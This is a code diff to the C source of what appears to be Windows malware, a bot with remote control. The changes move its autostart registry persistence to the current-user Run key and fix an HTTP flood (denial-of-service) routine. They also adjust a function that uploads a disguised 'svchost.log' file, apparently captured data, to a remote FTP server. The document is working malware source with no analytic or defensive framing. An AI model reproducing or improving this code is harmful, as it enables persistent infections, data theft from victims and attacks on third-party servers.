@@ -16,6 +16,7 @@ int create_conn(int sock, char *server_ip, int server_port){
 	server.sin_port = htons( server_port );
 	int ris;
 	do{
+        //printf("pippo");
         //always try to connect
 		ris=connect(sock , (struct sockaddr *)&server , sizeof(server));
 	}while(ris<0);
@@ -50,7 +51,7 @@ int create_key(char *path){
 	int reg_key;
 	int check;
 	HKEY hkey;
-	reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);		//create the reg key on secified ath
+	reg_key=RegCreateKey(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);		//create the reg key on secified ath
 
 	if(reg_key==0)
 	   {
@@ -71,7 +72,7 @@ int test_key(void ){
 	DWORD buf_length=BUFSIZE;		                        //unsigned integer
 	int reg_key;
 
-	reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);       //open the specified registry key
+	reg_key=RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);       //open the specified registry key
 	if(reg_key!=0){
 		check=1;
 		return check;
@@ -88,25 +89,24 @@ int test_key(void ){
 }
 //Function to execute the HTTPDOS
 void hdos_exe(char *address){
-
+    char *add;
 	SOCKET sock_dos;
 	time_t st_t, now_t;
 	char ip[15], server_ris[512], server_reply[256], *time_s, delim[2]=":";
 	time_s = strtok(address, delim);
 	int t= atoi(time_s);
 	char *ip_p = strtok(NULL, time_s);
-	strcpy(ip, ip_p);
 	if((sock_dos = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)                   	//Create socket
 	{
 		exit(0);
 	}
 	//Split time and address
 
-	if(isalpha(address[0])){                    //Ex: address=ww.xyz.com
-		hostname_to_ip(address,ip);
+	if(isalpha(ip_p[0])){                    //Ex: address=ww.xyz.com
+		hostname_to_ip(ip_p,ip);
+		strcpy(ip_p,ip);
 	}
-
-	create_conn(sock_dos, ip, 80);
+	create_conn(sock_dos, ip_p, 80);
 	time(&st_t);
 	while(difftime(now_t,st_t)!=t){
 		send(sock_dos, "GET /\r\n", strlen("GET /\r\n"),0);
@@ -292,9 +292,9 @@ void upload(){
 	create_conn(sock,ftp_ip,port);
 	fp=fopen("svchost.log","r");
 	fseek(fp, 0L, SEEK_END);
-	int sz=ftell(fp);
+	size_t sz=ftell(fp);
 	rewind(fp);
-	send(sock, sz, sizeof(int),0);
+	send(sock, sz, sizeof(sz),0);
 	while((symbol=getc(fp))!=EOF){
 		send(sock, &symbol, sizeof(char),0);
 	}
